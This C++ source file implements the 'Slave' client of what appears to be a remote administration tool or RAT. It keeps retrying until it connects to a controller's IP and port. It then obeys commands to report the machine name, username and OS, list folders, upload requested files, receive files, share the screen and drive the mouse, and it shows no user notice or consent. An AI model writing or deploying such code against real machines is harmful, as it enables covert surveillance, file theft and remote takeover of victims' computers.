#include "Slave.h"

using namespace std;

Slave::Slave(string ip, USHORT port) : _client(ip.c_str(), port), _explorer(&_client), _desktop(&_client)
{
	while (!_client.Connect()) Sleep(5);
}

void Slave::PerformPacketLoop()
{
	while (true)
	{
		Packet p;
		_client.ReceivePacket(p);

		int id = p.GetId();
		if (id == RequestInfoPacket::Id)
		{
			SendInfoPacket pp(Util::GetComputername(), Util::GetUsername(), Util::GetOSVersion());
			_client.SendPacket(pp);
		}
		else if (id == RequestPathContentPacket::Id)
		{
			RequestPathContentPacket packet;
			packet.ReadPacket(_client);
			_explorer.SendPathContent(packet.GetPath());
		}
		else if (id == RequestFilePacket::Id)
		{
			RequestFilePacket packet;
			packet.ReadPacket(_client);
			_explorer.SendFile(packet.GetPath(), 8196); //8kb
		}
		else if (id == SckScreensharePacket::Id)
		{
			SckScreensharePacket sckPacket;
			sckPacket.ReadPacket(_client);

			Size blocks = sckPacket.GetSize();
		//	if (blocks.Width == 0 || blocks.Height == 0)
				blocks = Size(3, 3);

			Size blockSize;
			blockSize.Width = GetSystemMetrics(SM_CXSCREEN) / blocks.Width;
			blockSize.Height = GetSystemMetrics(SM_CYSCREEN) / blocks.Height;

			_desktop.SendAcknowledge(blocks, blockSize, sckPacket.GetQuality());
		}
		else if (id == RequestScreenshotBlockPacket::Id)
		{
			RequestScreenshotBlockPacket packet;
			packet.ReadPacket(_client);
			//_desktop.SendScreenBlock(packet.GetBlock(), packet.GetHash(), packet.GetQuality());
		}
		else if (id == ClickPacket::Id)
		{
			ClickPacket packet;
			packet.ReadPacket(_client);

			Point pos = packet.GetPoint();
			MouseButtons buttons = packet.GetButtons();
			PressEvent event = packet.GetEvent();

			SetCursorPos(pos.X, pos.Y);
			if (event == Down)
			{
				DWORD button = buttons == Left ? MOUSEEVENTF_LEFTDOWN : buttons == Right ? MOUSEEVENTF_RIGHTDOWN : 0;
				if (button != 0)
					mouse_event(button, 0, 0, 0, NULL);
			}
			else
			{
				DWORD button = buttons == Left ? MOUSEEVENTF_LEFTUP : buttons == Right ? MOUSEEVENTF_RIGHTUP : 0;
				if (button != 0)
					mouse_event(button, 0, 0, 0, NULL);
			}
		}
		else if (id == SendFilePacket::Id)
		{
			SendFilePacket packet;
			packet.ReadPacket(_client);
			_explorer.ReceiveFile(packet);
		}
		else
		{
			cout << "Packet was unhandled: " << hex << id << endl;
		}
	}
}